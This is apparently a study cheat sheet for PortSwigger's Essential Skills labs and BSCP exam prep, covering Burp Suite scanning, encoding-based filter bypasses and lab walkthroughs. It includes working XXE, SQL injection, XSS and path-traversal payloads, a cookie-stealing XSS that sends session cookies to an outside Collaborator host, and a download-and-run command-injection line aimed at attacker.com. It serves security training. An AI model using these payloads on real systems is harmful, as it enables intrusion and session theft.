# Essential Skills - Cheat Sheet

**Rapid reference for PortSwigger Essential Skills techniques**

---

## Core Techniques

### 1. Targeted Scanning

**Purpose:** Scan specific requests instead of entire application

**When to Use:**
- Time constraints (10-minute labs)
- Identified suspicious endpoint
- High-value feature (auth, search, file ops)

**How to Use:**
```
1. Burp Proxy → HTTP History
2. Find suspicious request
3. Right-click → "Do active scan" or "Scan"
4. Configuration: "All except time-based detection"
5. Review findings in real-time
```

**Advantages:**
- 10x faster than full-site scan
- Focused results
- Fewer false positives
- Better time management

---

### 2. Scan Selected Insertion Point

**Purpose:** Test specific portion of request (non-standard data structures)

**When to Use:**
- Delimited values: `username:token`, `id|role`
- JSON in headers/cookies: `{"user":"admin"}`
- Base64-encoded data with internal structure
- Custom serialization formats

**How to Use:**
```
1. Send request to Repeater
2. Highlight ONLY the specific portion to test
   Example: In "session=wiener:token", highlight "wiener"
3. Right-click highlighted text
4. Select "Scan selected insertion point"
5. Review findings
```

**Example:**
```http
Cookie: session=wiener:AbCdEfGhIjKlMnOp1234567890
                ^^^^^^
                Highlight username only, not entire cookie
```

---

## Encoding Techniques

### URL Encoding

**Single Encoding:**
```
Space = %20 or +
<     = %3C
>     = %3E
'     = %27
"     = %22
/     = %2F
\     = %5C
;     = %3B
&     = %26
```

**Double Encoding:**
```
/  = %2F = %252F (% is encoded as %25)
<  = %3C = %253C
```

**Use Case:** Bypass filters that decode only once

**Example - Path Traversal:**
```
Normal:  ../../../../etc/passwd (blocked)
Encoded: ..%2f..%2f..%2f..%2fetc%2fpasswd (blocked)
Double:  ..%252f..%252f..%252f..%252fetc%252fpasswd (allowed ✓)
```

---

### HTML Encoding

**Named Entities:**
```
<  = &lt;
>  = &gt;
"  = &quot;
'  = &apos; or &#39;
&  = &amp;
```

**Decimal:**
```
<  = &#60;
>  = &#62;
'  = &#39;
"  = &#34;
```

**Hexadecimal:**
```
<  = &#x3C;
>  = &#x3E;
'  = &#x27;
"  = &#x22;
```

**Use Case:** XSS bypass, attribute injection

**Example:**
```html
Normal:  <img src=x onerror=alert(1)>
Encoded: <img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
         (alert(1) is HTML entity encoded)
```

---

### XML Encoding

**XML Entities:**
```
<  = &lt;
>  = &gt;
&  = &amp;
"  = &quot;
'  = &apos;
```

**Numeric Character References:**
```
<  = &#60; or &#x3C;
>  = &#62; or &#x3E;
U  = &#85; or &#x55;
S  = &#83; or &#x53;
```

**Use Case:** Bypass SQL keyword filters in XML requests

**Example - SQL Injection in XML:**
```xml
<!-- Blocked -->
<storeId>1 UNION SELECT NULL</storeId>

<!-- Bypass with XML entities -->
<storeId>1 &#85;NION &#83;ELECT NULL</storeId>

<!-- Or hex -->
<storeId>1 &#x55;NION &#x53;ELECT NULL</storeId>
```

**Lab:** "Lab: SQL injection with filter bypass via XML encoding"

---

### JavaScript Unicode

**Format:** `\uXXXX` (4 hex digits)

```
<  = \u003c
>  = \u003e
'  = \u0027
"  = \u0022
/  = \u002f
a  = \u0061
l  = \u006c
e  = \u0065
r  = \u0072
t  = \u0074
```

**Use Case:** JavaScript context XSS

**Example:**
```javascript
// Normal
<script>alert(1)</script>

// Unicode encoded
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

---

### SQL Encoding

**Hexadecimal:**
```sql
-- String 'admin' as hex
SELECT * FROM users WHERE username=0x61646d696e

-- Avoiding quotes
' OR '1'='1 → 0x27204f52202731273d2731
```

**CHAR() Function:**
```sql
-- 'admin' using CHAR()
CHAR(97,100,109,105,110)

-- 'UNION' using CHAR()
CHAR(85,78,73,79,78)
```

**Use Case:** Bypass quote/keyword filters

**Example:**
```sql
-- Blocked
SELECT * FROM users WHERE username='admin'

-- Bypass
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)
```

---

### Base64 Encoding

**Format:** A-Z, a-z, 0-9, +, /

**Encoding/Decoding:**
```bash
# Encode
echo -n "payload" | base64
# Output: cGF5bG9hZA==

# Decode
echo "cGF5bG9hZA==" | base64 -d
# Output: payload
```

**Use Case:** Complex payload obfuscation, JWT manipulation

**Example - Command Injection:**
```bash
# Original (blocked)
; curl attacker.com/shell.sh | bash

# Base64 obfuscated
; echo "Y3VybCBhdHRhY2tlci5jb20vc2hlbGwuc2ggfCBiYXNo" | base64 -d | bash
```

---

## Lab-Specific Payloads

### Lab 1: Targeted Scanning (XXE)

**Goal:** Retrieve `/etc/passwd` in 10 minutes

**XInclude Payload (Preferred):**
```xml
POST /product/stock HTTP/2
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/></foo></productId>
    <storeId>1</storeId>
</stockCheck>
```

**Classic XXE Payload (Alternative):**
```xml
POST /product/stock HTTP/2
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Strategy:**
1. Find XML endpoint (POST /product/stock)
2. Right-click → "Do active scan"
3. Scanner identifies XXE
4. Manual exploitation with above payloads

---

### Lab 2: Non-Standard Data Structures (Stored XSS → Session Hijacking)

**Goal:** Delete user "carlos"

**Step 1: Get Burp Collaborator URL**
```
Burp menu → Burp Collaborator client → Copy to clipboard
Example: abc123xyz.oastify.com
```

**Step 2: XSS Payload in Cookie**
```http
Cookie: session=<script>document.location='https://abc123xyz.oastify.com/?c='%2bdocument.cookie;</script>:TOKEN
```

**URL-Encoded Version:**
```http
Cookie: session=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fabc123xyz.oastify.com%2F%3Fc%3D%27%252bdocument.cookie%3B%3C%2Fscript%3E:TOKEN
```

**Step 3: Inject Payload**
- Intercept any request with Burp
- Replace Cookie header with XSS payload
- Forward request

**Step 4: Poll Collaborator**
- Burp Collaborator client → "Poll now"
- Extract admin cookie from callback:
  ```
  GET /?c=session=administrator:AdminToken123... HTTP/1.1
  ```

**Step 5: Delete Carlos**
```http
GET /admin/delete?username=carlos HTTP/2
Host: [lab-id].web-security-academy.net
Cookie: session=administrator:AdminToken123...
```

**Strategy:**
1. Login with wiener:peter
2. Observe cookie format: `username:token`
3. Highlight username → "Scan selected insertion point"
4. Scanner finds stored XSS
5. Exploit to steal admin cookie
6. Use admin session to delete carlos

---

## Burp Suite Commands

### Scanner Settings

**Fast Configuration (Time-Constrained):**
```
Scanner → Scan configuration → New
Audit checks → All except time-based detection ✓
```

**Thorough Configuration:**
```
Audit checks → All ✓
```

**Custom (XSS Focus):**
```
Audit checks → Custom
Select: Cross-site scripting (reflected/stored/DOM)
```

---

### Collaborator

**Access:**
```
Burp menu → Burp Collaborator client
```

**Copy URL:**
```
Click "Copy to clipboard"
Format: YOUR-ID.oastify.com
```

**Poll for Callbacks:**
```
Click "Poll now"
Review HTTP/DNS interactions
```

**Extract Data:**
```
HTTP requests show exfiltrated data in URL parameters
Example: /?c=session=admin:token
```

---

### Repeater

**Shortcuts:**
```
Ctrl+R / Cmd+R = Send to Repeater
Ctrl+Space = Send request
Ctrl+Shift+R = Change request method (GET ↔ POST)
```

**Scan from Repeater:**
```
Right-click in Request → "Scan" or "Do active scan"
Right-click highlighted text → "Scan selected insertion point"
```

---

### Decoder

**Access:**
```
Burp menu → Decoder (or dedicated tab)
```

**Usage:**
```
1. Paste text/data
2. Select encoding from dropdown:
   - URL
   - HTML
   - Base64
   - Hex
   - ASCII hex
   - Gzip
3. Apply encoding/decoding
4. Chain multiple operations
```

---

## Mystery Lab Strategy

### Reconnaissance Checklist (15 min)

**Features to Map:**
- [ ] Authentication (login, registration, password reset)
- [ ] Search functionality
- [ ] User-generated content (comments, posts)
- [ ] File upload
- [ ] Admin panel (/admin, /administrator)
- [ ] APIs (check network tab)
- [ ] User profile/account settings

**Test Account:**
```
Username: wiener
Password: peter
```

---

### Vulnerability Testing Checklist (30 min)

**SQL Injection:**
```
' OR '1'='1'--
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
1' ORDER BY 1--
```

**XSS:**
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
```

**Access Control:**
```
- Try accessing /admin
- Manipulate ID parameters (IDOR)
- Test with different user roles
- Change HTTP methods (POST → GET)
```

**Path Traversal:**
```
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252f..%252fetc%252fpasswd
```

**Command Injection:**
```
; whoami
| whoami
` whoami `
$(whoami)
```

**XXE (if XML endpoint):**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**CSRF:**
```
- Check for anti-CSRF tokens
- Test token validation
- Try removing token
```

---

### Common Vulnerability Locations

| Feature | Likely Vulnerability |
|---------|---------------------|
| Login/Auth | SQLi, brute force, timing attacks |
| Search | SQLi, XSS |
| Comments | Stored XSS, CSRF |
| File Upload | RCE, path traversal, XXE |
| User Profile | IDOR, XSS, CSRF |
| Admin Panel | Access control bypass |
| API Endpoints | IDOR, mass assignment, XXE |
| Password Reset | Account takeover, parameter pollution |

---

## Context-Specific Encoding Reference

| Context | Encoding Required | Example |
|---------|------------------|---------|
| URL Parameter | URL Encoding | `?search=%3Cscript%3E` |
| HTML Body | HTML Entities | `<div>&#60;script&#62;</div>` |
| JavaScript String | Unicode / Escaping | `var x='\u003cscript\u003e';` |
| SQL String | Hex / CHAR() | `WHERE id=0x31` or `CHAR(49)` |
| XML Data | XML Entities | `<data>&#60;script&#62;</data>` |
| JSON Value | JSON Escaping | `{"input":"\u003cscript\u003e"}` |
| HTTP Header | ASCII / URL | `Header: value%0d%0a` |
| Cookie | URL Encoding | `Cookie: name=%3Cscript%3E` |

---

## Time Management

### Lab Time Targets

| Lab | Beginner | Intermediate | Expert |
|-----|----------|--------------|--------|
| Lab 1: Targeted Scanning | 15-20 min | 10-12 min | 5-7 min |
| Lab 2: Non-Standard Data | 25-30 min | 15-20 min | 10-12 min |
| Mystery Lab (Practitioner) | 90 min | 60 min | 30-45 min |

---

### Phase Time Allocation

**Lab 1 (10-minute constraint):**
```
0-2 min:   Recon - find XML endpoint
2-4 min:   Targeted scan
4-8 min:   Manual XXE exploitation
8-10 min:  Verify /etc/passwd retrieved
```

**Lab 2:**
```
0-3 min:   Login, observe cookie
3-6 min:   Scan username insertion point
6-8 min:   Craft/inject XSS payload
8-10 min:  Wait for Collaborator callback
10-12 min: Use stolen session, delete carlos
```

**Mystery Lab:**
```
0-15 min:  Reconnaissance
15-20 min: Hypothesis generation
20-50 min: Systematic testing
50-65 min: Exploitation
65-70 min: Verification
```

---

## Common Mistakes

### ❌ Don't Do This

1. **Running full-site scans** - Wastes time, too many results
2. **Ignoring scanner findings** - Missing valuable hints
3. **Not reviewing findings in real-time** - Waiting for scan completion
4. **Testing entire cookie/parameter** - Should use "Scan selected insertion point"
5. **Not URL-encoding payloads in cookies** - Payloads may not parse correctly
6. **Forgetting to poll Collaborator** - Missing exfiltrated data
7. **Over-encoding** - Encoding everything when only specific chars need it

---

### ✅ Best Practices

1. **Targeted scans** - Scan specific requests, not entire app
2. **Scan selected insertion points** - Test non-standard data structures
3. **Review findings immediately** - Don't wait for scan completion
4. **Verify manually** - Always confirm scanner findings
5. **Use Collaborator** - For blind vulnerabilities and data exfiltration
6. **Start simple** - Test basic payload before encoding
7. **Combine techniques** - Human intuition + automated testing

---

## Quick Decision Tree

### Should I Use Targeted Scanning?

```
Is there a time constraint? → YES → Use targeted scanning
Do I have a suspicious endpoint? → YES → Use targeted scanning
Is the app large (100+ pages)? → YES → Use targeted scanning
Am I testing everything? → NO → Use targeted scanning
```

### Should I Use "Scan Selected Insertion Point"?

```
Is the data delimited (user:token, id|role)? → YES
Is there JSON in a header/cookie? → YES
Is there Base64 with internal structure? → YES
Is the format non-standard? → YES
```

### What Encoding Should I Try?

```
Is the context a URL parameter? → URL encoding
Is it reflected in HTML? → HTML entities
Is it in a JavaScript string? → Unicode escaping
Is it XML with keyword filter? → XML entities
Is it SQL with quote filter? → Hex or CHAR()
Is everything blocked? → Double encoding or Base64
```

---

## Certification Prep (BSCP)

### Requirements Checklist

- [ ] Complete all Apprentice labs
- [ ] Complete all Practitioner labs
- [ ] Complete 5 Practitioner Mystery Labs
- [ ] Master targeted scanning technique
- [ ] Master "Scan selected insertion point"
- [ ] Comfortable with encoding bypasses
- [ ] Can complete labs without solutions
- [ ] Average time: Practitioner labs under 20 min

---

### Mystery Lab Practice Routine

**Weekly Practice:**
```
Day 1: One Practitioner Mystery Lab (60 min target)
Day 3: One Practitioner Mystery Lab (45 min target)
Day 5: One Practitioner Mystery Lab (30 min target)
```

**Track Progress:**
- Lab ID
- Time taken
- Vulnerability type
- Techniques used
- Mistakes made
- Lessons learned

---

## Keyboard Shortcuts

### Burp Suite

```
Ctrl+Shift+B / Cmd+Shift+B = Burp menu
Ctrl+R / Cmd+R = Send to Repeater
Ctrl+I / Cmd+I = Send to Intruder
Ctrl+Space = Send request (in Repeater)
Ctrl+Shift+R = Change request method
```

### Browser

```
F12 = Developer tools
Ctrl+Shift+C = Inspect element
Ctrl+R = Reload
Ctrl+Shift+R = Hard reload (clear cache)
```

---

## One-Liner Reference

**Targeted Scan:**
```
Right-click request → "Do active scan" → "All except time-based"
```

**Scan Insertion Point:**
```
Highlight text → Right-click → "Scan selected insertion point"
```

**Collaborator:**
```
Burp menu → Burp Collaborator → Copy → Poll
```

**Encode URL:**
```
Burp Decoder → Paste → "Encode as... URL"
```

**Encode HTML:**
```
Burp Decoder → Paste → "Encode as... HTML"
```

**XXE (XInclude):**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

**XSS Cookie Injection:**
```html
<script>location='https://COLLAB/?c='+document.cookie</script>
```

**SQL XML Encoding:**
```xml
&#85;NION &#83;ELECT = UNION SELECT
```

---

## Emergency Lab Solutions

### Lab 1: Can't find vulnerability in 10 minutes?

**Emergency Strategy:**
1. Focus ONLY on "Check stock" feature
2. Send `POST /product/stock` to Repeater
3. Try XInclude payload directly (no scanning)
4. If that fails, try classic XXE with DOCTYPE

### Lab 2: Collaborator not receiving callback?

**Emergency Checklist:**
- [ ] Did you URL-encode the payload in cookie?
- [ ] Is the token portion still intact after colon?
- [ ] Did you poll Collaborator? (Click "Poll now")
- [ ] Wait 60 seconds and poll again
- [ ] Try simpler payload: `<script>alert(document.cookie)</script>` first

---

## Resources

**Official:**
- Essential Skills: https://portswigger.net/web-security/essential-skills
- Lab 1: .../lab-discovering-vulnerabilities-quickly-with-targeted-scanning
- Lab 2: .../lab-scanning-non-standard-data-structures
- Mystery Labs: https://portswigger.net/web-security/mystery-lab-challenge

**This Skill:**
- [Complete Guide](./essential-skills-portswigger-labs-complete.md)
- [Quick Start](./essential-skills-quickstart.md)
- [Resources](./essential-skills-resources.md)

---

**Print and keep next to your keyboard during lab practice!**
